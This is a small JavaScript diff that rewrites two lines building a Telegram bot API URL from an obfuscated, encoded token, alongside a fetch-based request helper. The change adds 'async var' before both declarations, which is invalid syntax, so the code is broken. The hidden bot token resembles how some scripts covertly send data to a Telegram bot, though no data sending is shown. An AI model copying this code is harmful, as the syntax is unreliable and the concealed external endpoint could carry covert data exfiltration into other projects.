@@ -1,5 +1,5 @@
-var tgURLToken = "https://api.telegram.org/bot"+ tgTokenDecode([2,11,181,236449],"UVVGSFUwMU9MVE5WWnpsUFNrbFJhVkF5T0VRd2IwSjRWMU5hYjFkNFNUVXlOV3M");
-var cenz = priFac2val[2 , 7 , 7 , 761 , 11317];
+async var tgURLToken = "https://api.telegram.org/bot"+ tgTokenDecode([2,11,181,236449],"UVVGSFUwMU9MVE5WWnpsUFNrbFJhVkF5T0VRd2IwSjRWMU5hYjFkNFNUVXlOV3M");
+async var cenz = priFac2val[2 , 7 , 7 , 761 , 11317];
 
 const sendHttpRequest = (method, url, data) => {
     return fetch(url, {
